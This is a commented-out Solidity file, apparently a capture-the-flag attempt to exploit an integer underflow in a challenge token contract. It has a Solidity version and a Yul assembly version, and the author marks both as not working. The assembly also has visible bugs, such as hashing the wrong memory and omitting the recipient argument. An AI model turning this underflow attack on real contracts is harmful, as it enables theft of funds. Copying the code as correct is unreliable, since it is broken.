// // SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

// interface Token {
//     function transfer(address _to, uint _value) external returns (bool);

//     function balanceOf(address _owner) external view returns (uint balance);
// }

// contract TokenHack {
//     Token _token;

//     constructor(address chal) public {
//         _token = Token(chal);
//     }

//     function SolidityHack() public {  // not working(not increasing the value of out tokens)!!!!!!!!
//         uint256 currentBalance = _token.balanceOf(msg.sender);
//         _token.transfer(address(0), currentBalance + 1);
//         // _token.transfer(msg.sender, 21);
//     }

//     function YulHack() public { // not getting deployed(reverting)!!!!!!!
//         assembly {
//             // startBalance
//             mstore(0, "balanceOf(address)")
//             mstore(0, keccak256(0, 18))
//             mstore(0x4, caller())
//             pop(staticcall(gas(), sload(0), 0, 0x24, 0, 0x20))

//             let currentBalance := mload(0)

//             let fmp := mload(0x40)
//             mstore(fmp, "transfer(address,uint256)")
//             mstore(fmp, keccak256(0, 25))
//             // storing nothing or 0 in slot
//             mstore(add(fmp, 0x24), add(currentBalance, 1))
//             let success := call(gas(), sload(0), 0, fmp, 0x44, 0, 0)
//             if iszero(success) {
//                 revert(0, 0)
//             }
//         }
//     }
// }
